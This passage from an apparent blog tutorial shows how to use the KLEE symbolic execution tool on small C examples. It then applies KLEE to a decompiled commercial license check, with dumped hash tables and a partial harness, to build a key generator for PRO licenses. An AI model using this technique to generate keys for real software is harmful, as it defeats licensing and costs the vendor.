</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You lose</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>KLEE can resolve this problem for us, if we provide symbolic inputs and actually an assert to trigger:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">input</span><span class="p">,</span> <span class="n">result</span><span class="p">;</span>
</span><span class='line'>    <span class="n">klee_make_symbolic</span><span class="p">(</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span> <span class="s">&quot;input&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">magic_computation</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="mi">253</span><span class="p">)</span>
</span><span class='line'>        <span class="n">klee_assert</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Run KLEE and print the result:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">clang</span> <span class="o">-</span><span class="n">emit</span><span class="o">-</span><span class="n">llvm</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">o</span> <span class="n">magic</span><span class="p">.</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">magic</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="err">$</span> <span class="n">klee</span> <span class="n">magic</span><span class="p">.</span><span class="n">ll</span>
</span><span class='line'><span class="err">$</span> <span class="n">ktest</span><span class="o">-</span><span class="n">tool</span> <span class="o">--</span><span class="n">write</span><span class="o">-</span><span class="n">ints</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000001</span><span class="p">.</span><span class="n">ktest</span>
</span><span class='line'><span class="n">ktest</span> <span class="n">file</span> <span class="o">:</span> <span class="err">&#39;</span><span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000001</span><span class="p">.</span><span class="n">ktest</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">args</span>       <span class="o">:</span> <span class="p">[</span><span class="err">&#39;</span><span class="n">magic</span><span class="p">.</span><span class="n">ll</span><span class="err">&#39;</span><span class="p">]</span>
</span><span class='line'><span class="n">num</span> <span class="n">objects</span><span class="o">:</span> <span class="mi">1</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">name</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">input</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">size</span><span class="o">:</span> <span class="mi">4</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">data</span><span class="o">:</span> <span class="o">-</span><span class="mi">254</span>
</span></code></pre></td></tr></table></div></figure>


<p>The answer is -254. Let&rsquo;s test it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">gcc</span> <span class="n">magic</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span><span class="p">.</span><span class="n">out</span> <span class="o">-</span><span class="mi">254</span>
</span><span class='line'><span class="n">You</span> <span class="n">win</span><span class="o">!</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yes!</p>

<h2>KLEE, libc and command line arguments</h2>

<p>Not all the functions are so simple. At least we could have calls to the C standard library such as <code>strlen</code>, <code>atoi</code>, and such. We cannot link our test code with the system available C library, as it is not inspectable by KLEE. For example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">input</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">input</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we run it with KLEE we get this error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">clang</span> <span class="o">-</span><span class="n">emit</span><span class="o">-</span><span class="n">llvm</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">o</span> <span class="n">atoi</span><span class="p">.</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">atoi</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="err">$</span> <span class="n">klee</span> <span class="n">atoi</span><span class="p">.</span><span class="n">ll</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">output</span> <span class="n">directory</span> <span class="n">is</span> <span class="s">&quot;/work/klee-out-4&quot;</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">WARNING</span><span class="o">:</span> <span class="n">undefined</span> <span class="n">reference</span> <span class="n">to</span> <span class="n">function</span><span class="o">:</span> <span class="n">atoi</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">WARNING</span> <span class="n">ONCE</span><span class="o">:</span> <span class="n">calling</span> <span class="n">external</span><span class="o">:</span> <span class="n">atoi</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">ERROR</span><span class="o">:</span> <span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">atoi</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span> <span class="n">failed</span> <span class="n">external</span> <span class="n">call</span><span class="o">:</span> <span class="n">atoi</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">NOTE</span><span class="o">:</span> <span class="n">now</span> <span class="n">ignoring</span> <span class="n">this</span> <span class="n">error</span> <span class="n">at</span> <span class="n">this</span> <span class="n">location</span>
</span><span class='line'><span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>To fix this we can use the KLEE uClibc and POSIX runtime. Taken from the help:</p>

<p><em>&ldquo;If we were running a normal native application, it would have been linked with the C library, but in this case KLEE is running the LLVM bitcode file directly. In order for KLEE to work effectively, it needs to have definitions for all the external functions the program may call. Similarly, a native application would be running on top of an operating system that provides lower level facilities like write(), which the C library uses in its implementation. As before, KLEE needs definitions for these functions in order to fully understand the program. We provide a POSIX runtime which is designed to work with KLEE and the uClibc library to provide the majority of operating system facilities used by command line applications&rdquo;</em>.</p>

<p>Let&rsquo;s try to use these facilities to test our <code>atoi</code> function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">klee</span> <span class="o">--</span><span class="n">optimize</span> <span class="o">--</span><span class="n">libc</span><span class="o">=</span><span class="n">uclibc</span> <span class="o">--</span><span class="n">posix</span><span class="o">-</span><span class="n">runtime</span> <span class="n">atoi</span><span class="p">.</span><span class="n">ll</span> <span class="o">--</span><span class="n">sym</span><span class="o">-</span><span class="n">args</span> <span class="mi">0</span> <span class="mi">1</span> <span class="mi">3</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">NOTE</span><span class="o">:</span> <span class="n">Using</span> <span class="n">klee</span><span class="o">-</span><span class="n">uclibc</span> <span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">klee</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">klee</span><span class="o">-</span><span class="n">uclibc</span><span class="p">.</span><span class="n">bca</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">NOTE</span><span class="o">:</span> <span class="n">Using</span> <span class="n">model</span><span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">klee</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">libkleeRuntimePOSIX</span><span class="p">.</span><span class="n">bca</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">output</span> <span class="n">directory</span> <span class="n">is</span> <span class="s">&quot;/work/klee-out-5&quot;</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">WARNING</span> <span class="n">ONCE</span><span class="o">:</span> <span class="n">calling</span> <span class="n">external</span><span class="o">:</span> <span class="n">syscall</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">21505</span><span class="p">,</span> <span class="mi">70495424</span><span class="p">)</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">ERROR</span><span class="o">:</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">klee</span><span class="o">-</span><span class="n">uclibc</span><span class="o">/</span><span class="n">libc</span><span class="o">/</span><span class="n">stdlib</span><span class="o">/</span><span class="n">stdlib</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">526</span><span class="o">:</span> <span class="n">memory</span> <span class="n">error</span><span class="o">:</span> <span class="n">out</span> <span class="n">of</span> <span class="n">bound</span> <span class="n">pointer</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">NOTE</span><span class="o">:</span> <span class="n">now</span> <span class="n">ignoring</span> <span class="n">this</span> <span class="n">error</span> <span class="n">at</span> <span class="n">this</span> <span class="n">location</span>
</span><span class='line'>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">total</span> <span class="n">instructions</span> <span class="o">=</span> <span class="mi">5756</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">completed</span> <span class="n">paths</span> <span class="o">=</span> <span class="mi">68</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">generated</span> <span class="n">tests</span> <span class="o">=</span> <span class="mi">68</span>
</span></code></pre></td></tr></table></div></figure>


<p>And KLEE founds the possible out of bound access in our program. Because you know, our program is bugged :) Before to jump and fix our code, let me briefly explain what these new flags did:</p>

<ul>
<li><code>--optimize</code>: this is for dead code elimination. It is actually a good idea to use this flag when working with non-trivial applications, since it speeds things up;</li>
<li><code>--libc=uclibc</code> and <code>--posix-runtime</code>: these are the aforementioned options for uClibc and POSIX runtime;</li>
<li><code>--sym-args 0 1 3</code>: this flag tells KLEE to run the program with minimum 0 and maximum 1 argument of length 3, and make the arguments symbolic.</li>
</ul>


<p>Note that adding <code>atoi</code> function to our code, adds 68 execution paths to the program. Using many libc functions in our code adds complexity, so we have to use them carefully when we want to reverse complex functions.</p>

<p>Let now make the program safe by adding a check to the command line argument length. Let&rsquo;s also add an assertion, because it is fun :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;assert.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;klee/klee.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">?</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="mi">42</span><span class="p">)</span>
</span><span class='line'>        <span class="n">klee_assert</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We could also have written <code>klee_assert(result != 42)</code>, and get the same result. No matter what solution we adopt, now we have to run KLEE as before:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">clang</span> <span class="o">-</span><span class="n">emit</span><span class="o">-</span><span class="n">llvm</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">o</span> <span class="n">atoi2</span><span class="p">.</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">atoi2</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="err">$</span> <span class="n">klee</span> <span class="o">--</span><span class="n">optimize</span> <span class="o">--</span><span class="n">libc</span><span class="o">=</span><span class="n">uclibc</span> <span class="o">--</span><span class="n">posix</span><span class="o">-</span><span class="n">runtime</span> <span class="n">atoi2</span><span class="p">.</span><span class="n">ll</span> <span class="o">--</span><span class="n">sym</span><span class="o">-</span><span class="n">args</span> <span class="mi">0</span> <span class="mi">1</span> <span class="mi">3</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">NOTE</span><span class="o">:</span> <span class="n">Using</span> <span class="n">klee</span><span class="o">-</span><span class="n">uclibc</span> <span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">klee</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">klee</span><span class="o">-</span><span class="n">uclibc</span><span class="p">.</span><span class="n">bca</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">NOTE</span><span class="o">:</span> <span class="n">Using</span> <span class="n">model</span><span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">klee</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">libkleeRuntimePOSIX</span><span class="p">.</span><span class="n">bca</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">output</span> <span class="n">directory</span> <span class="n">is</span> <span class="s">&quot;/work/klee-out-6&quot;</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">WARNING</span> <span class="n">ONCE</span><span class="o">:</span> <span class="n">calling</span> <span class="n">external</span><span class="o">:</span> <span class="n">syscall</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">21505</span><span class="p">,</span> <span class="mi">53243904</span><span class="p">)</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">ERROR</span><span class="o">:</span> <span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">atoi2</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span> <span class="n">ASSERTION</span> <span class="n">FAIL</span><span class="o">:</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">NOTE</span><span class="o">:</span> <span class="n">now</span> <span class="n">ignoring</span> <span class="n">this</span> <span class="n">error</span> <span class="n">at</span> <span class="n">this</span> <span class="n">location</span>
</span><span class='line'>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">total</span> <span class="n">instructions</span> <span class="o">=</span> <span class="mi">5962</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">completed</span> <span class="n">paths</span> <span class="o">=</span> <span class="mi">73</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">generated</span> <span class="n">tests</span> <span class="o">=</span> <span class="mi">69</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we go! We have fixed our bug. KLEE is also able to find an input to make the assertion fail:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">ls</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">err</span>
</span><span class='line'><span class="n">test000016</span><span class="p">.</span><span class="n">assert</span><span class="p">.</span><span class="n">err</span>
</span><span class='line'><span class="err">$</span> <span class="n">ktest</span><span class="o">-</span><span class="n">tool</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000016</span><span class="p">.</span><span class="n">ktest</span>
</span><span class='line'><span class="n">ktest</span> <span class="n">file</span> <span class="o">:</span> <span class="err">&#39;</span><span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000016</span><span class="p">.</span><span class="n">ktest</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">args</span>       <span class="o">:</span> <span class="p">[</span><span class="err">&#39;</span><span class="n">atoi</span><span class="p">.</span><span class="n">ll</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="o">--</span><span class="n">sym</span><span class="o">-</span><span class="n">args</span><span class="err">&#39;</span><span class="p">,</span> <span class="sc">&#39;0&#39;</span><span class="p">,</span> <span class="sc">&#39;1&#39;</span><span class="p">,</span> <span class="sc">&#39;3&#39;</span><span class="p">]</span>
</span><span class='line'><span class="n">num</span> <span class="n">objects</span><span class="o">:</span> <span class="mi">3</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">name</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">arg0</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">size</span><span class="o">:</span> <span class="mi">4</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">1</span><span class="o">:</span> <span class="n">data</span><span class="o">:</span> <span class="err">&#39;</span><span class="o">+</span><span class="mi">42</span><span class="err">\</span><span class="n">x00</span><span class="err">&#39;</span>
</span><span class='line'><span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the answer is the string &ldquo;+42&rdquo;&hellip; as we know.</p>

<p>There are many other KLEE options and functionalities, but let&rsquo;s move on and try to solve our original problem. Interested readers can find a good tutorial, for example, in <a href="http://klee.github.io/tutorials/testing-coreutils/">How to Use KLEE to Test GNU Coreutils</a>.</p>

<h2>KLEE keygen</h2>

<p>Now that we know basic KLEE commands, we can try to apply them to our particular case. We have understood some of the validation algorithm, but we don&rsquo;t know the computation details. They are just a mess of arithmetical and logical operations that we are tired to analyze.</p>

<p>Here is our plan:</p>

<ul>
<li>we need at least a valid customer number, a serial number and a mail address;</li>
<li>more ambitiously we want a list of them, to make a key generator.</li>
</ul>


<p>This is a possibility:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// copy and paste of all the registration code</span>
</span><span class='line'><span class="k">enum</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">ERROR</span><span class="p">,</span>
</span><span class='line'>    <span class="n">STANDARD</span><span class="p">,</span>
</span><span class='line'>    <span class="n">PRO</span>
</span><span class='line'><span class="p">}</span> <span class="n">license_type</span> <span class="o">=</span> <span class="n">ERROR</span><span class="p">;</span>
</span><span class='line'><span class="c1">// ...</span>
</span><span class='line'><span class="k">enum</span> <span class="n">result_t</span> <span class="nf">check_registration</span><span class="p">(</span><span class="kt">int</span> <span class="n">serial</span><span class="p">,</span> <span class="kt">int</span> <span class="n">customer_num</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">mail</span><span class="p">);</span>
</span><span class='line'><span class="c1">// ...</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">serial</span><span class="p">,</span> <span class="n">customer</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">mail</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'>    <span class="k">enum</span> <span class="n">result_t</span> <span class="n">result</span><span class="p">;</span>
</span><span class='line'>    <span class="n">klee_make_symbolic</span><span class="p">(</span><span class="o">&amp;</span><span class="n">serial</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serial</span><span class="p">),</span> <span class="s">&quot;serial&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">klee_make_symbolic</span><span class="p">(</span><span class="o">&amp;</span><span class="n">customer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">customer</span><span class="p">),</span> <span class="s">&quot;customer&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">klee_make_symbolic</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mail</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mail</span><span class="p">),</span> <span class="s">&quot;mail&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">valid</span> <span class="o">=</span> <span class="n">check_registration</span><span class="p">(</span><span class="n">serial</span><span class="p">,</span> <span class="n">customer</span><span class="p">,</span> <span class="n">mail</span><span class="p">);</span>
</span><span class='line'>    <span class="n">valid</span> <span class="o">&amp;=</span> <span class="n">license_type</span> <span class="o">==</span> <span class="n">PRO</span><span class="p">;</span>
</span><span class='line'>    <span class="n">klee_assert</span><span class="p">(</span><span class="o">!</span><span class="n">valid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Super simple. Copy and paste everything, make the inputs symbolic and assert a certain result (negated, of course).</p>

<p>No! That&rsquo;s not so simple. This is actually the most difficult part of the game. First of all, what do we want to copy? We don&rsquo;t have the source code. In my case I used Hex-Rays decompiler, so maybe I have cheated. When you decompile, however, you don&rsquo;t get immediately a compilable C source code, since there could be dependencies between functions, global variables, and specific Hex-Rays types. For this latter problem I&rsquo;ve prepared a <a href="https://github.com/mbrt/keygen-post/blob/master/src/ida_defs.h"><code>ida_defs.h</code></a> header, providing defines coming from IDA and from Windows headers.</p>

<p>But what to copy? The high level picture of the validation algorithm I have presented is an ideal one. The <code>check_registration</code> function is actually a big set of auxiliary functions and data, very tightened with other parts of the program. Even if we now know the most interesting functions, we need to know how much of the related code, is useful or not. We cannot throw everything in our key generator, since every function brings itself other related data and functions. In this way we will end up having the whole program in it. We need to minimize the code KLEE has to analyze, otherwise it will be too difficult to have its job done.</p>

<p>This is a picture of the high level workflow, as IDA proximity view proposes:</p>

<p><img src="https://raw.githubusercontent.com/mbrt/keygen-post/master/known_license_func_diagram.png" alt="Known license functions" /></p>

<p>and this is the overview for a single node of this schema (precisely <code>license_getType</code>):</p>

<p><img src="https://raw.githubusercontent.com/mbrt/keygen-post/master/get_license_type_overview.png" alt="license_getType overview" /></p>

<p>As you can imagine, the complete call graph becomes really big in the end.</p>

<p>In the cleanup process I have done, a big bunch of functions removed is the one extracting and loading the table of valid mail addresses. To do this I stepped with the debugger until the table was completely loaded and then dumped the memory of the process. Then I&rsquo;ve used a nice &ldquo;export to C array&rdquo; functionality of <a href="http://www.hexworkshop.com/">HEX Workshop</a>, to export the actual piece of memory of the mail table to actual code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">uint16_t</span> <span class="n">hashHeader</span><span class="p">[</span><span class="mi">8192</span><span class="p">]</span> <span class="o">=</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'><span class="kt">int16_t</span> <span class="n">hashData</span><span class="p">[</span><span class="mi">1000000</span><span class="p">]</span> <span class="o">=</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="mi">15306</span><span class="p">,</span> <span class="mi">18899</span><span class="p">,</span> <span class="mi">18957</span><span class="p">,</span> <span class="o">-</span><span class="mi">24162</span><span class="p">,</span> <span class="mi">63045</span><span class="p">,</span> <span class="o">-</span><span class="mi">26834</span><span class="p">,</span> <span class="o">-</span><span class="mi">21</span><span class="p">,</span> <span class="o">-</span><span class="mi">39653</span><span class="p">,</span> <span class="mi">271441</span><span class="p">,</span> <span class="o">-</span><span class="mi">5588</span><span class="p">,</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'><span class="p">};</span>
